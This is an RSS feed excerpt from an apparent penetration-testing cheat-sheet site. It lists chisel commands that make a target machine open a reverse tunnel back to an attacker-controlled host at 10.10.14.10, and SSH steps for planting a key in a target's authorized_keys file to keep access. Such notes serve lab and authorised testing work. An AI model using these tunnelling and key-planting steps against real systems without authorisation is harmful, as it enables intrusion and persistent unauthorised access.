channel.title: Ssh on TLDRBins
channel.description: Recent content in Ssh on TLDRBins

item.title: Network Traffic Pivoting
item.description: Chisel Download chisel Start a Local chisel Server # In our local Linux machine ./chisel server --reverse --port 8000 chisel with ports # In target machine ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 chisel with socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1080 # In target machine .

item.title: SSH
item.description: Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo '<id_rsa.pub>' >> /home/user/.ssh/authorized_keys Connect to SSH with id_rsa ssh user@10.10.11.10 -i id_rsa Note: Always append a new line in id_rsa key Connect to SSH with creds ssh user@10.10.11.10 # After first connection (i.e., after 'yes' to fingerprint prompt) sshpass -p 'password' ssh user@10.
